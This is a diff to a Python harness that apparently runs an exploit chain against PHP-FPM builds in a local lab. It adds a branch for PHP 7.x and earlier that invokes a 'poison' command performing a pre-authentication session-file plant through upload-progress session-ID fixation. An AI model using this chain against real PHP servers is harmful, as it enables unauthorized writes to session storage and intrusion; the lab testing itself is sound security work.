@@ -63,10 +63,8 @@ def verify(version: str) -> tuple[str, str]:
         return "patched (skipped)", ""
     source = os.path.join(ROOT, "lab", "fpm", "runtime", "src",
                           f"php-{version}")
-    if os.path.isdir(source) and not registry.has_session_cancel_decode(source):
-        return ("chain n/a (no cancel_decode)", "PHP <= 7.x never frees the "
-                                                "unserialize struct on the "
-                                                "bailout")
+    uses_legacy_chain = (os.path.isdir(source)
+                         and not registry.has_session_cancel_decode(source))
 
     proof = f"matrix-{version.replace('.', '')}"
     local = os.path.join(OUTDIR, proof)
@@ -80,6 +78,23 @@ def verify(version: str) -> tuple[str, str]:
     chain, builder, _chain_fpm, _builder_fpm = labs.builds_map([version])[version]
     base = f"http://127.0.0.1:{chain}"
     builder_url = f"http://127.0.0.1:{builder}"
+
+    if uses_legacy_chain:
+        # PHP <= 7.x: the struct-freeing chain does not apply, but the
+        # upload-progress session-ID fixation does (see cmd_poison)
+        print(f"\n===== {version}: session-file plant (pre-auth) =====",
+              flush=True)
+        plant = f"matrix-{version.replace('.', '')}"
+        proc = run([sys.executable, CLIENT, "--version", version,
+                    "--base", base, "--builder", builder_url, "poison",
+                    "--sid", plant, "--payload",
+                    f"PLANTED_{plant}"], timeout=600)
+        for line in (proc.stdout + proc.stderr).strip().splitlines()[-3:]:
+            print("   ", line, flush=True)
+        lab(version, "down")
+        ok = proc.returncode == 0
+        return (("SESSION PLANT" if ok else "plant failed"),
+                "pre-auth write into sess_<sid>" if ok else "")
 
     if not profile_verified(version):
         print(f"\n===== {version}: calibrating over HTTP =====", flush=True)
